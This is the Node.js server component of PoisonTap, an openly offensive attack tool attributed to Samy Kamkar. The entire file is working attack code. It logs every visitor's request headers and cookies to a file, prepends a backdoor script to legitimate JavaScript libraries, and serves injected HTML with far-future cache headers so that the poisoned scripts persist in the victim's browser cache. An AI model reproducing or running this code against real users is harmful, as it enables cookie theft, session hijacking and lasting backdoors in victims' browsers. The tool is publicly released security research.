/*
 * PoisonTap
 *  by samy kamkar
 *  http://samy.pl/poisontap
 *  01/08/2016
 * 
 */

var http = require("http");
var fs = require('fs');
var util = require('util');
var backdoorPreJs = fs.readFileSync(__dirname + '/target_backdoor.js'); // this gets prepended before legit js, eg jquery.js
var backdoorHtml = fs.readFileSync(__dirname + '/backdoor.html');
var log_file = fs.createWriteStream(__dirname + '/poisontap.cookies.log', {flags : 'a'});
var log_stdout = process.stdout;
var replacejs = fs.readdirSync(__dirname + '/js');
var repobj = {};
for (var i in replacejs)
	repobj[replacejs[i].replace(/__/g, '/')] = fs.readFileSync(__dirname + '/js/' + replacejs[i]);

console.log = function(d) {
  log_file.write(util.format(d) + '\n');
  log_stdout.write(util.format(d) + '\n');
};

var xhtml = fs.readFileSync(__dirname + '/target_injected_xhtmljs.html');
if (!xhtml)
{
	console.log("Couldn't read PoisonTap evil html");
	process.exit();
}

var server = http.createServer(function(request, response) {
	var url = request.headers.host + request.url;
	console.log('Request: ' + url);
	console.log(request.headers);

	var headers = {
		"Content-Type": "text/html",
		"Server": "PoisonTap/1.0 SamyKamkar/0.1",
		"Cache-Control": "public, max-age=99936000",
		"Expires": "Sat, 26 Jul 2040 05:00:00 GMT",
		"Last-Modified": "Tue, 15 Nov 1994 12:45:26 GMT"
	};

	// cache for a very long time to poison future requests after we're gone
	if (repobj[url])
	{
		response.writeHead(200, headers);
		response.write(backdoorPreJs);
		response.write(repobj[url]);
		response.end();
		return;
	}

	// if this is a poisontap request, we just siphoned cookies, now drop html backdoor
	else if (url.indexOf('/PoisonTap') != -1)
	{
		response.writeHead(200, headers);
		response.write(backdoorHtml);
		response.end();
		return;
	}

  // random AJAX request or load from a page, give our evil content that loads all the backdoors and siphons all the things
	else
	{
		response.writeHead(200, headers);

		// NOT poisontap hit, inject cross-js/html file
		response.write(xhtml);
		response.end();
		return;
	}
});

server.listen(1337);
console.log("PoisonTap is listening");
